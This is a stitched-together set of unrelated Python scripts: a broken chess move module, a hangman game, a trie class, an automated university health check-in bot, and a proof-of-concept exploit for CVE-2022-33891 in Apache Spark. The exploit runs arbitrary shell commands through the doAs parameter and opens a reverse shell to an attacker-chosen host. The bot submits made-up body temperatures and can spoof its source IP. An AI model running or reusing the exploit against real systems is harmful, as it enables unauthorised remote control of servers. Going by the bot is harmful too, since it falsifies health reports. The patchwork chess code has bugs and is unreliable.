# Thanks ChatGPT (shhh)
def king_move(lst, row, col):
    adjacent_places = []
    rows = len(lst)
    cols = len(lst[0])

    # Define the neighboring positions
    positions = [
        (row - 1, col),     # Top
        (row + 1, col),     # Bottom
        (row, col - 1),     # Left
        (row, col + 1),     # Right
        (row - 1, col - 1), # Top Left
        (row - 1, col + 1), # Top Right
        (row + 1, col - 1), # Bottom Left
        (row + 1, col + 1)  # Bottom Right
    ]

    # Iterate over the neighboring positions
    for position in positions:
        r, c = position
        # Check if the neighboring position is within bounds
        if 0 <= r < rows and 0 <= c < cols and lst[r][c][0]!= lst[row][col][0]:
            adjacent_places.append([r,c])

    return adjacent_places


def pawn_move(lst, row, col):
    moves = []
    if lst[row][col][0] == "b":
        if row+1>7:
            return moves
        if lst[row + 1][col] == " ":
            moves.append([row+1, col])
            # double move add en passant to fgn :/
            if row == 1 and lst[row + 2][col] == " ":
                moves.append([row+2, col])
        if col+1<8 and (lst[row + 1][col+1][0] != lst[row][col][0] or lst[row + 1][col+1] == "we") and lst[row + 1][col+1] != " ":
            moves.append([row+1, col+1])
        if col-1>-1 and (lst[row + 1][col-1][0] != lst[row][col][0] or lst[row + 1][col-1] == "we") and lst[row + 1][col-1] != " ":
            moves.append([row+1,col-1])
    if lst[row][col][0] == "w":
        if row-1<-1:
            return moves
        if lst[row - 1][col] == " ":
            moves.append([row-1, col])
             # double move add en passant to fgn :/
            if row == 6 and lst[row - 2][col] == " ":
                moves.append([row-2, col])
        if col+1<8 and (lst[row - 1][col+1][0] != lst[row][col][0] or lst[row - 1][col+1] == "be") and lst[row - 1][col+1] != " ":
            moves.append([row-1, col+1])
        if col-1>-1 and (lst[row - 1][col-1][0] != lst[row][col][0] or lst[row - 1][col-1] == "be") and lst[row - 1][col-1] != " ":
            moves.append([row-1, col-1])
    return moves

def rook_move(lst, row, col):
    moves = []
    for i in range(col-1, -1, -1):
        if lst[row][i] == " ": 
            moves.append([row, i])
        elif lst[row][i][0] == lst[row][col][0]: 
            break
        else:
            moves.append([row, i])
            break
    for i in range(col+1, 8):
        if lst[row][i] == " ": 
            moves.append([row, i])
        elif lst[row][i][0] == lst[row][col][0]: 
            break
        else:
            moves.append([row, i])
            break
    for i in range(row-1, -1, -1):
        if lst[i][col] == " ": 
            moves.append([i, col])
        elif lst[i][col][0] == lst[row][col][0]: 
            break
        else:
            moves.append([i, col])
            break
    for i in range(row+1, 8):
        if lst[i][col] == " ": 
            moves.append([i, col])
        elif lst[i][col][0] == lst[row][col][0]: 
            break
        else:
            moves.append([i, col])
            break
    return moves

def bishop_move(lst, row, col):
    moves = []
    i,j = row-1, col+1
    while i>-1 and j<8:
        if lst[i][j] == " " or  lst[i][j] == "e": 
            moves.append([i, j])
        elif lst[i][j][0] == lst[row][col][0]: 
            break
        else:
            moves.append([i, j])
            break
        i-=1
        j+=1
    i,j = row+1, col+1
    while i<8 and j<8:
        if lst[i][j] == " " or  lst[i][j] == "e": 
            moves.append([i, j])
        elif lst[i][j][0] == lst[row][col][0]: 
            break
        else:
            moves.append([i, j])
            break
        i+=1
        j+=1
    i,j = row-1, col-1
    while i>-1 and j>-1:
        if lst[i][j] == " " or  lst[i][j] == "e": 
            moves.append([i, j])
        elif lst[i][j][0] == lst[row][col][0]: 
            break
        else:
            moves.append([i, j])
            break
        i-=1
        j-=1
    i,j = row+1, col-1
    while i<8 and j>-1:
        if lst[i][j] == " " or  lst[i][j] == "e": 
            moves.append([i, j])
        elif lst[i][j][0] == lst[row][col][0]: 
            break
        else:
            moves.append([i, j])
            break
        i+=1
        j-=1
    return moves

def knight_move(lst, row, col):
    moves = []
    if row-2>-1:
        if col+1<8 and lst[row-2][col+1][0] != lst[row][col][0]:
            moves.append([row-2, col+1])
        if col-1>-1 and lst[row-2][col-1][0] != lst[row][col][0]:
            moves.append([row-2, col-1])
    if row+2<8:
        if col+1<8 and lst[row-2][col+1][0] != lst[row][col][0]:
            moves.append([row+2, col+1])
        if col-1>-1 and lst[row-2][col-1][0] != lst[row][col][0]:
            moves.append([row+2, col-1])
    if col-2>-1:
        if row+1<8 and lst[row+1][col-2][0] != lst[row][col][0]:
            moves.append([row+1, col-2])
        if row-1>-1 and lst[row-1][col-2][0] != lst[row][col][0]:
            moves.append([row-1, col-2])
    if col+2<8:
        if row+1<8 and lst[row+1][col+2][0] != lst[row][col][0]:
            moves.append([row+1, col+2])
        if row-1>-1 and lst[row-1][col+2][0] != lst[row][col][0]:
            moves.append([row-1, col+2])
    return moves

def queen_move(lst, row, col):
    moves = [rook_move(lst, row, col), bishop_move(lst, row, col)]
    moves = [j for i in moves for j in i]
    return moves

def is_check(oldlst, turn, pieceMoves, move, piece, oldloc):
    canMove = True
    lst = []
    for i in oldlst:
        lst.append(i.copy())
    lst[oldloc[1]][oldloc[0]] = " "
    lst[move[0]][move[1]] = piece
    for i in lst:
        for j in i:
            if j[0] == turn:
                for a in range(len(lst)):
                    for b in range(len(lst[a])):
                        if len(lst[a][b])>1 and lst[a][b][0]!= turn and not "e" in lst[a][b]:
                            for k in pieceMoves[lst[a][b][1]](lst, a, b):
                                if ("k" in lst[k[0]][k[1]]):
                                    canMove = False
    return canMove

class Piece(pygame.sprite.Sprite):
    def __init__(self, locx, locy, colour, piece):
        super().__init__()
        img = pygame.image.load(f"images\\{colour}{piece}.png")
        img = pygame.transform.scale(img,(100,100))

        self.image = img
        self.colour = colour
        self.piece = piece

        self.rect = self.image.get_rect()
        self.rect.x = locx*100
        self.rect.y = locy*100


class Tile(pygame.sprite.Sprite):
    def __init__(self, locx, locy, colour, height, width):
        super().__init__()

        self.image = pygame.Surface([width, height])

        self.width = width
        self.height = height

        pygame.draw.rect(self.image,
                         colour,
                         pygame.Rect(0, 0, width, height))

        self.cb = False
        if colour != (90, 180, 120): self.cb = True

        self.oldLoc = [0,0]
        self.moveable = False
        self.pieceSelected = " "
        self.selected = False

        self.rect = self.image.get_rect()
        self.rect.x = locx
        self.rect.y = locy

if __name__ == "__main__":
    print(main())

"""
Hangman example Assisted with basic coding tools, 2024
"""

import random


def select_word():
    word_list = ["apple", "banana", "cherry", "date", "elderberry", "fig", "grape", "honeydew", "imbe", "jackfruit"]
    return random.choice(word_list)


def update_word(word, guessed_letters):
    masked_word = ""
    for letter in word:
        if letter in guessed_letters:
            masked_word += letter
        else:
            masked_word += "_"
    return masked_word


def hangman():
    tries = 6
    word = select_word()
    guessed_letters = []

    print("Welcome to Hangman!")
    print("Guess the letters of the word. You have 6 tries.")

    while tries > 0:
        print("\nWord:", update_word(word, guessed_letters))
        print("Tries remaining:", tries)

        guess = input("Enter a letter: ").lower()

        if guess in guessed_letters:
            print("You already guessed that letter. Try again.")
            continue

        guessed_letters.append(guess)

        if guess not in word:
            tries -= 1
            print("Incorrect guess!")

            if tries == 0:
                print("You lost! The word was:", word)
        else:
            masked_word = update_word(word, guessed_letters)
            if masked_word == word:
                print("Congratulations! You won!")
                break

    play_again = input("Do you want to play again? (yes/no): ").lower()
    if play_again == "yes":
        hangman()
    else:
        print("Thank you for playing Hangman!")


hangman()

#!/usr/bin/env python3
import requests
import argparse
import base64
import datetime
from colorama import Fore

parser = argparse.ArgumentParser(description='CVE-2022-33891 Python POC Exploit Script')
parser.add_argument('-u', '--url', help='URL to exploit.', required=True)
parser.add_argument('-p', '--port', help='Exploit target\'s port.', required=True)
parser.add_argument('--revshell', default=False, action="store_true", help="Reverse Shell option.")
parser.add_argument('-lh', '--listeninghost', help='Your listening host IP address.')
parser.add_argument('-lp', '--listeningport', help='Your listening host port.')
parser.add_argument('--check', default=False, action="store_true", help="Checks if the target is exploitable with a sleep test")
parser.add_argument('--verbose', default=False, action="store_true", help="Verbose mode")

args = parser.parse_args()

# nothing to see here, move along!
headers = {
    'User-Agent': 'CVE-2022-33891 POC',
}

# Colors :D
info = (Fore.BLUE + "[*] " + Fore.RESET)
recc = (Fore.YELLOW + "[*] " + Fore.RESET)
good = (Fore.GREEN + "[+] " + Fore.RESET)
important = (Fore.CYAN + "[!] " + Fore.RESET)
printError = (Fore.RED + "[X] " + Fore.RESET)

full_url = f"{args.url}:{args.port}"


def check_for_vuln(url):
    try:
        print(info + "Attempting to connect to site...")
        r = requests.get(f"{url}/?doAs='testing'", allow_redirects=False, headers=headers)
        if args.verbose:
            print(info + f"URL request: {url}/?doAs='testing'")
            print(info + f"Response status code: {r.status_code}")
        if r.status_code != 403:
            print(printError + "No ?doAs= endpoint. Does not look vulnerable.")
            quit(1)
        elif "org.apache.spark.ui" not in r.content.decode("utf-8"):
            print(printError + "Does not look like an Apache Spark server.")
            quit(1)
        else:
            print(important + "Performing sleep test of 10 seconds...")
            t1 = datetime.datetime.now()
            if args.verbose:
                print(info + f"T1: {t1}")
            run_cmd("sleep 10")
            t2 = datetime.datetime.now()
            delta = t2-t1
            if args.verbose:
                print(info + f"T2: {t2}")
                print(info + f"Delta T: {delta.seconds}")
            if delta.seconds not in range(8,12):
                print(printError + "Sleep was less than 10. This target is probably not vulnerable")
            else:
                print(good + "Sleep was 10 seconds! This target is probably vulnerable!")
            exit(0)
    except Exception as e:
        print(printError + str(e))


def cmd_prompt():
    cmd = input("[cve-2022-33891> ")
    return cmd


def base64_encode(cmd):
    try:
        message_bytes = cmd.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_cmd = base64_bytes.decode('ascii')
        return base64_cmd
    except Exception as e:
        print(printError +str(e))


def run_cmd(cmd):
    try:
        if args.verbose:
            print(info + "Command is: " + cmd)
        base64_cmd = base64_encode(cmd)
        if args.verbose:
            print(info + "Base64 command is: " + base64_cmd)
        exploit = f"/?doAs=`echo {base64_cmd} | base64 -d | bash`"
        exploit_req = f"{full_url}{exploit}"
        if args.verbose:
            print(info + "Full exploit request is: " + exploit_req)
            print(info + "Sending exploit...")
        r = requests.get(exploit_req, allow_redirects=False, headers=headers)
        if args.verbose:
            print(info + f"Response status code: {r.status_code}\n"+ info + "Hint: 403 is good.")
    except Exception as e:
        print(printError + str(e))
        quit(1)


def revshell(lhost, lport):
    print(info + f"Reverse shell mode.\n" + recc+ f"Set up your listener by entering the following:\nnc -nvlp {lport}")
    input(recc + "When your listener is set up, press enter!")
    rev_shell_cmd = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    run_cmd(rev_shell_cmd)


def main():
    try:
        if args.check and args.revshell:
            print(printError + "Please choose either revshell or check!")
            exit(1)

        elif args.check:
            check_for_vuln(full_url)

        # Revshell
        elif args.revshell:
            if not (args.listeninghost and args.listeningport):
                print(printError + "You need --listeninghost and --listeningport!")
                exit(1)
            else:
                lhost = args.listeninghost
                lport = args.listeningport
                revshell(lhost, lport)
        else:
            # "Interactive" mode
            print(info + "\"Interactive\" mode!\n" + important + "Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.")
            while True:
                command_to_run = cmd_prompt()
                run_cmd(command_to_run)
    except KeyboardInterrupt:
        print("\n"+ info + "Goodbye!")


if __name__ == "__main__":
    main()

#!/usr/bin/python
# -*- coding: UTF-8 -*-
import re
import time
from datetime import timedelta, timezone, datetime
from random import randint
from re import Pattern

from requests import session, Response, Session

from notifier import Notifier

shanghai_tz = timezone(timedelta(hours=8), name='Asia/Shanghai')


def get_current_hour() -> int:
    now = datetime.utcnow().replace(tzinfo=timezone.utc)
    return now.astimezone(shanghai_tz).hour


class Job:
    _login_header: dict = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'pass.neu.edu.cn',
        'Origin': 'https://pass.neu.edu.cn',
    }

    _init_url: str = 'https://e-report.neu.edu.cn/login'

    _service_url: str = 'https://e-report.neu.edu.cn/notes/create'

    _update_info_url: str = 'https://e-report.neu.edu.cn/api/notes'

    _feedback_url: str = "https://e-report.neu.edu.cn/notes"

    _lt_matcher: Pattern = re.compile(r'name="lt" value="(.+?)"')

    _login_path_matcher: Pattern = re.compile(r'id="loginForm" action="(.+?)"')

    _token_matcher: Pattern = re.compile(r'name="_token" value="(.+?)"')

    _name_matcher: Pattern = re.compile(r'当前用户：(.+?) <span')

    _class_matcher: Pattern = re.compile(r'"suoshubanji":"(.+?)"')

    _date_matcher: Pattern = re.compile(r'"created_on":"(.+?)"')

    _wrong_auth: str = '账号或密码错误'
    _bad_info: str = '信息获取失败'
    _bad_init_login: str = '获取登陆信息失败'

    def __init__(self, username: str, password: str, ip: str = ''):
        self._username: str = username
        self._password: str = password
        self._ip: str = ip
        self._client: Session = session()

        # 获取到的跨步骤共用中间信息
        self._token: str = ""
        self._name: str = ""
        self._lt = ""
        self._login_path: str = ""
        self._class: str = ""
        self._date: str = ""

    @property
    def _login_body(self) -> str:
        return f'rsa={self._username}{self._password}{self._lt}&ul={len(self._username)}&pl={len(self._password)}&lt={self._lt}&execution=e1s1&_eventId=submit'

    @property
    def _login_url(self) -> str:
        return f'https://pass.neu.edu.cn{self._login_path}'

    @property
    def _update_info_body(self) -> str:
        return f'_token={self._token}&jibenxinxi_shifoubenrenshangbao=1&profile%5Bxuegonghao%5D={self._username}&profile%5Bsuoshubanji%5D={self._class}&jiankangxinxi_muqianshentizhuangkuang=%E6%AD%A3%E5%B8%B8&xingchengxinxi_weizhishifouyoubianhua=0&qitashixiang_qitaxuyaoshuomingdeshixiang='

    @property
    def _update_info_header(self) -> dict:
        h = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'e-report.neu.edu.cn',
            'Origin': 'https://e-report.neu.edu.cn',
        }
        if len(self._ip) > 0:
            h['X-Forwarded-For'] = self._ip
        return h

    @property
    def _info_url(self) -> str:
        return f'https://e-report.neu.edu.cn/api/profiles/{self._username}?xingming={self._name}'

    @property
    def _body_temperature(self) -> float:
        return 36 + randint(4, 7) / 10

    @property
    def _report_body_temperature_url(self) -> str:
        hour = get_current_hour()
        item_id = 1 if 7 <= hour <= 9 else 2 if 12 <= hour <= 14 else 3
        return f'https://e-report.neu.edu.cn/inspection/items/{item_id}/records'

    @property
    def _report_body_temperature_body(self) -> str:
        return f'_token={self._token}&temperature={self._body_temperature}&suspicious_respiratory_symptoms=0&symptom_descriptions='

    @staticmethod
    def _is_login_success(resp: Response) -> bool:
        return resp.url.startswith("https://e-report.neu.edu.cn")

    # property 不好看
    def _is_reported(self) -> bool:
        return self._date == time.strftime(r'%Y-%m-%d', time.localtime())

    @staticmethod
    def _unexpected_exception(error: Exception = None) -> str:
        return f'网络错误或其他错误\n{error}'

    def _login(self) -> (bool, str):
        try:
            resp: Response = self._client.get(self._init_url)
            lt: list = self._lt_matcher.findall(resp.text)
            lp: list = self._login_path_matcher.findall(resp.text)
            if len(lt) < 1 or len(lp) < 1:
                return False, self._bad_init_login
            self._lt = lt[0]
            self._login_path = lp[0]

            resp: Response = self._client.post(self._login_url, data=self._login_body, headers=self._login_header)
            if self._is_login_success(resp):
                return True, ''
            return False, self._wrong_auth
        except Exception as e:
            return False, self._unexpected_exception(e)

    def _login_service(self) -> (bool, str):
        try:
            resp: Response = self._client.get(self._service_url)
            self._token = self._token_matcher.findall(resp.text)[0]
            self._name = self._name_matcher.findall(resp.text)[0]
            return True, ''
        except Exception as e:
            return False, self._unexpected_exception(e)

    def _get_info(self) -> (bool, str):
        try:
            resp: Response = self._client.get(self._info_url)

            if resp.text.find(self._username) == -1:
                return False, self._bad_info

            date = self._date_matcher.findall(resp.text)
            klass = self._class_matcher.findall(resp.text)

            if len(date) < 1 or len(klass) < 1:
                return False, self._bad_info

            self._date = date[0]
            self._class = klass[0]

            return True, ''
        except Exception as e:
            return False, self._unexpected_exception(e)

    def _update_info(self) -> (bool, str):
        try:
            resp: Response = self._client.post(self._update_info_url, data=self._update_info_body,
                                               headers=self._update_info_header)
            if resp.status_code == 201:
                return True, ""
            return False, resp.text
        except Exception as e:
            return False, self._unexpected_exception(e)

    def _report_body_temperature(self):
        try:
            resp: Response = self._client.post(self._report_body_temperature_url,
                                               data=self._report_body_temperature_body,
                                               headers=self._update_info_header)
            print(resp.status_code)
            if resp.status_code == 200:
                return True, ""
            return False, resp.text
        except Exception as e:
            return False, self._unexpected_exception(e)

    def do(self, notifier: Notifier):
        today = time.strftime('%m/%d/%Y')

        # 登陆
        success, msg = self._login()
        if not success:
            notifier.send(f"{today} 登陆失败", msg)
            return
        # 进入平台
        success, msg = self._login_service()
        if not success:
            notifier.send(f"{today} 鉴权失败", msg)
            return
        # 获取信息
        success, msg = self._get_info()
        if not success:
            notifier.send(f"{today} 获取已有信息失败", msg)
            return
        # 是否今日有签到过
        if not self._is_reported():
            # 打卡
            success, msg = self._update_info()
            if not success:
                notifier.send(f"{today} 打卡失败", msg)
                return
            notifier.send(f"{today} 打卡成功", "I'm fine, thank you.")

        # 上报体温
        success, msg = self._report_body_temperature()
        if not success:
            notifier.send(f"{today} 上报体温失败", msg)
            return
        notifier.send(f"{today} 上报体温成功", "I'm fine, really thank you.")

""" Trie boiler plate code Supported by standard GitHub tools and verified by Alex Badia  """

class TrieNode:
  def __init__(self):
    self.children = {}
    self.is_end_of_word = False

class Trie:
  def __init__(self):
    self.root = TrieNode()

  def insert(self, words):
    node = self.root
    for word in words:
      if word not in node.children:
        node.children[word] = TrieNode()
      node = node.children[word]
    node.is_end_of_word = True

  def search(self, words):
    node = self.root
    for word in words:
      if word not in node.children:
        return False
      node = node.children[word]

    return node.is_end_of_word

  def count_paths(self, node=None):
    if node is None:
      node = self.root
    count = 1 if node.is_end_of_word else 0
    for child in node.children.values():
      count += self.count_paths(child)
    return count

  def print_trie(self, node=None, word=""):
    if node is None:
      node = self.root
    if node.is_end_of_word:
      print(word)
    for k, v in node.children.items():
      self.print_trie(v, word + " " + k)

  def pretty_print_trie(self, filename):
    with open(filename, 'w') as file:
      self._pretty_print_trie_helper(self.root, "", file)

  def _pretty_print_trie_helper(self, node, word, file):
    if node.is_end_of_word:
      file.write(word + '\n')
    for k, v in node.children.items():
      self._pretty_print_trie_helper(v, word + " " + str(k), file)

